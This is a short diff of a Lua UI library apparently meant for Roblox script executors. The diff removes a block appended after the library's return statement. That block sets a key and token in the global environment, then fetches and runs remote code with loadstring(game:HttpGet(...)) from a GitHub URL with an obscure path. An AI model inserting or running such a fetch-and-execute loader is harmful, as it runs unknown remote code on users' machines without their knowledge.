@@ -1,6 +1,3 @@
-pcall(function()
-    game:GetService('CoreGui')['Symmetrical v4']:Destroy()
-end)
 if not getgenv().theme then getgenv().theme = Color3.fromRGB(255,105,180) end
 local library = {flags = {}, windows = {}, open = true}
 --Services
@@ -1626,12 +1623,3 @@ inputService.InputChanged:connect(function(input)
 	end
 end)
 return library
-
-getgenv().secure = '06e499927fbf2c527f80bb0da63afcf3455083be';
-getgenv().key = 'F!##(I@-)(@#!U*HGPBQ-!#F*HUQN*@N!'
- wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/F13CKILLA"))();
-
-pcall(function()
-    getgenv().rconsoleprint = p
-end)
